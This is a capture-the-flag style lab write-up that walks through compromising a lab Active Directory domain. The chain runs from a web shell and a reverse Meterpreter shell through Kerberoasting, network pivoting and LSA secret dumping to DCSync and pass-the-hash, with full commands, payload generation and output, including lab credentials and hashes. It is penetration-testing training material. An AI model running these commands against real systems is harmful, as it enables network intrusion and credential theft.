Summary

This Hard assessment starts us right on a compromised web server (WEB-WIN01) with a teammate's password-protected web shell already in place. From that single foothold the chain runs through the whole Active Directory attack lifecycle: Kerberoasting a service account from SYSTEM, pivoting into the internal network with Meterpreter, dumping LSA secrets to recover a cached user, and finally abusing that user's DCSync rights to pull the domain Administrator hash and pass-the-hash onto the domain controller.

💡 Environment

Entry host: WEB-WIN01 (SYSTEM via web shell)
Internal subnet: 172.16.6.0/23
Targets: MS01 (172.16.6.50), DC01 (172.16.6.3)
Key skills: Kerberoasting, Meterpreter pivoting, LSA secrets, DCSync, Pass-the-Hash

// starting note

Our teammate left a password-protected web shell (credentials admin:My_W3bsH3ll_P@ssw0rd!) in the /uploads directory for us to start from.

Web Shell Foothold

The foothold is already waiting, we just need to reach it. Browsing to /uploads shows two files. web.config returns a 404, so that's a dead end, leaving antak.aspx as our way in. Logging in with the provided credentials drops us into the ANTAK web shell.

First thing on any shell: figure out who and where we are.

powershell
PS> hostname
WEB-WIN01

PS> whoami
nt authority\system
🔑 Already SYSTEM

The web shell runs as NT AUTHORITY\SYSTEM, the highest local privilege. That matters later: SYSTEM on a domain-joined host is exactly what makes the Kerberoasting step trivial.

Upgrading to Meterpreter

A web shell is fine for one-off commands, but for real enumeration and pivoting we want a proper interactive session. I generated a Meterpreter reverse shell with msfvenom and caught it with multi/handler.

bash
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.204 -f exe -o revshell.exe LPORT=8008
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
Payload size: 509 bytes
Final size of exe file: 7680 bytes
Saved as: revshell.exe

$ msfconsole -q
msf > use multi/handler
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 10.10.14.204
msf exploit(multi/handler) > set LPORT 8008
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.204:8008

The web shell can upload files, which land in C:\. With the listener running, executing revshell.exe brings the session back.

meterpreter
[*] Sending stage (248902 bytes) to 10.129.84.115
[*] Meterpreter session 1 opened (10.10.14.204:8008 -> 10.129.84.115:49707)

meterpreter > cat C:\Users\Administrator\Desktop\flag.txt
JusT********

First flag is sitting on the Administrator desktop, easy grab now that we have a real session.

Kerberoasting from SYSTEM

The next objective points at a specific service account, the one holding the SPN MSSQLSvc/SQL01.inlanefreight.local:1433. To find it we enumerate every SPN in the domain with the built-in setspn.exe.

powershell: setspn
PS C:\Users\Administrator\Desktop> setspn.exe -Q */*
Checking domain DC=INLANEFREIGHT,DC=LOCAL
...
CN=****,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SQL01.inlanefreight.local:1433
CN=sqlprod,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SQL02.inlanefreight.local:1433
...
Existing SPN found!

The account tied to that SPN shows up right next to it, which answers the first question. Now to crack its password.

📊 Why Kerberoasting Works

Any authenticated user can request a service ticket (TGS) for an SPN. That ticket is encrypted with the service account's password hash, so if the account has a weak password, we can request the ticket and crack it offline, no interaction with the account itself.

Since we're SYSTEM on a domain host, we request the TGS straight into memory with a .NET call, then let Mimikatz export it.

powershell: request TGS
PS> Add-Type -AssemblyName System.IdentityModel
PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
      -ArgumentList "MSSQLSvc/SQL01.inlanefreight.local:1433"

ServicePrincipalName : MSSQLSvc/SQL01.inlanefreight.local:1433
ValidFrom            : 8/4/2026 12:04:57 PM
ValidTo              : 8/4/2026 9:24:13 PM

With the ticket cached, transfer Mimikatz over (I used a quick Python HTTP server) and export it as base64 so we can paste it straight onto the attack host, no .kirbi file transfer needed.

mimikatz: export ticket
mimikatz # base64 /out:true
isBase64InterceptOutput is true

mimikatz # kerberos::list /export
[00000000] - 0x00000012 - aes256_hmac
   Server Name : krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
====================
doIFSDCCBUSgAwIBBaEDAgE9DQUyiNTAzoAMCAQKhLDAqGwhNU1NRTFN2Yxse<...SNIP...>

Back on the attack host, strip the newlines, base64-decode into a .kirbi, convert to a John-friendly hash with kirbi2john, and crack against rockyou.

bash: crack the ticket
$ cat blob.txt | tr -d '\n' | base64 -d > TGT.kirbi
$ kirbi2john TGT.kirbi > TGT.txt
tickets written: 1

$ john --format=krb5tgs -w /usr/share/wordlists/rockyou.txt TGT.txt
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
lu***           (?)
1g 0:00:00:00 DONE
Session completed.
🔑 Service Account Cracked

The krb5tgs hash falls almost instantly, handing us the cleartext password for the svc_sql service account. Reused credentials are the whole point of Kerberoasting, and this one gets reused immediately.

Pivoting to MS01

Those credentials are only useful if we can reach the internal hosts. A ping sweep from Meterpreter maps the subnet.

meterpreter: ping sweep
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.6.0/23
[+]     172.16.6.3 host found
[+]     172.16.6.50 host found
[+]     172.16.6.100 host found

We're 172.16.6.100, so the other two are the DC and MS01. nbtstat resolves which is which.

cmd: nbtstat
C:\>nbtstat -A 172.16.6.3
    DC01           <20>  UNIQUE      Registered

C:\>nbtstat -A 172.16.6.50
    MS01           <20>  UNIQUE      Registered

So 172.16.6.3 is DC01 and 172.16.6.50 is MS01. To reach that subnet from our own tooling we add a route through the session with autoroute, then scan MS01 through it.

meterpreter: autoroute
meterpreter > run autoroute -s 172.16.6.0/23
[+] Added route to 172.16.6.0/255.255.254.0 via 10.129.84.115
bash: scan through the route
$ nmap -Pn -sT -T4 172.16.6.50 --min-rate 1000
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy

RDP (3389) is open. A port forward exposes it locally, and we log in with the cracked svc_sql credentials.

bash: portfwd + RDP
meterpreter > portfwd add -l 1234 -p 3389 -r 172.16.6.50

$ xfreerdp /u:svc_sql /p:lucky7 /v:127.0.0.1:1234 \
    /drive:share,/home/pix/Desktop/Tools/Active-Directory +clipboard

The account has Administrator rights on MS01, so the second flag is a simple read.

cmd: flag
C:\Users\Administrator\Desktop>type flag.txt
spn$_*****

LSA Secrets & a New User

Next we hunt for another domain user's credentials. query user shows a second account with an active console session on the box.

cmd: query user
C:\Users\Administrator\Desktop>query user
 USERNAME     SESSIONNAME   ID  STATE   LOGON TIME
 t***         console       1   Active  8/4/2026 6:22 AM
>svc_sql      rdp-tcp#0     2   Active  8/4/2026 7:21 AM

My first instinct was Mimikatz for a cleartext dump, but WDIGEST is disabled here, so the wdigest and kerberos password fields come back (null). We only get the NTLM hash.

mimikatz: WDIGEST null
* Username : t****
* NTLM     : fd37b6fec5704cadabb319cebf9e3a3a
wdigest :
 * Password : (null)
kerberos :
 * Password : (null)
⚠️ WDIGEST Disabled

On modern Windows, WDIGEST cleartext caching is off by default, so Mimikatz's sekurlsa::logonpasswords won't just hand over the password. That's a dead end for cleartext here, so we pivot to a different source: LSA secrets, which cache the last logon's plaintext for some accounts.

We already have autoroute, so spinning up the socks_proxy module lets us reach MS01 through proxychains and dump LSA secrets with netexec.

// proxychains tip

Make sure the SOCKS version in the Metasploit module matches what proxychains4.conf expects (socks4a vs socks5). A mismatch here is the classic cause of silent timeouts, check it first if the connection just hangs.

bash: netexec --lsa
$ proxychains4 netexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa
SMB  172.16.6.50  445  MS01  [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 (Pwn3d!)
SMB  172.16.6.50  445  MS01  [*] Dumping LSA secrets
SMB  172.16.6.50  445  MS01  INLANEFREIGHT\t****:Sup***********
SMB  172.16.6.50  445  MS01  [+] Dumped 10 LSA secrets
🔑 Cleartext Recovered

The LSA dump hands us the target user's cleartext password at the bottom of the output, exactly the value Mimikatz couldn't give us. Two different tools, one succeeds where the other can't.

DCSync Rights & Domain Takeover

Before using the new user we check what it can actually do in the domain. Sharing PowerView.ps1 over the RDP-mounted drive, we grab the user's SID and inspect the domain object's ACL for replication rights.

powershell: check replication ACL
PS> Get-ObjectAcl "DC=INLANEFREIGHT,DC=LOCAL" -ResolveGUIDs `
    | ?{$_.ObjectAceType -match 'Replication-Get'} `
    | ?{$_.SecurityIdentifier -eq $sid} `
    | select ActiveDirectoryRights,ObjectAceType | fl

ActiveDirectoryRights : ExtendedRight
ObjectAceType         : DS-Replication-Get-Changes

ActiveDirectoryRights : ExtendedRight
ObjectAceType         : DS-Replication-Get-Changes-All
⚠️ DCSync Rights

The pair DS-Replication-Get-Changes + DS-Replication-Get-Changes-All is exactly what a DCSync attack needs. With both, this user can impersonate a domain controller and ask the real DC to replicate any account's password hashes, including the domain Administrator and krbtgt.

So we DCSync the domain Administrator with impacket-secretsdump, straight through proxychains.

bash: DCSync
$ proxychains4 impacket-secretsdump -just-dc-user administrator \
    INLANEFREIGHT/t*****@172.16.6.3
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:27dedb1da*****a0:::
[*] Kerberos keys grabbed
[*] Cleaning up...

We have the Administrator NT hash. A quick port check shows WinRM (5985) open on the DC, so we pass-the-hash straight in with evil-winrm, no password needed.

bash: pass-the-hash to DC01
$ proxychains4 evil-winrm -i 172.16.6.3 -u Administrator \
    -H 27dedb1dab4d8545c6e1c66fba077da0

*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
-a----   4/11/2022   7:17 PM   19 flag.txt
🏆 Domain Compromise

The chain is complete: web shell (SYSTEM) → Kerberoast svc_sql → pivot to MS01 → LSA secrets → DCSync rights → pass-the-hash on DC01. Reading the final flag.txt from the domain controller's Administrator desktop closes out Part I. Domain owned.

🎯 Key Takeaways

  • Left-behind artifacts are footholds: a forgotten web shell handed us SYSTEM with zero exploitation.
  • SYSTEM on a domain host = easy Kerberoasting: request the TGS into memory, export with Mimikatz, crack offline.
  • One session becomes a network: autoroute + socks_proxy turn a single Meterpreter shell into full internal reach.
  • WDIGEST off isn't the end: when Mimikatz returns (null), LSA secrets can still recover cleartext.
  • Replication rights are domain ownership: Get-Changes + Get-Changes-All on a normal user means DCSync.
  • DCSync into Pass-the-Hash: pull the Administrator hash, then authenticate to the DC with the hash alone.
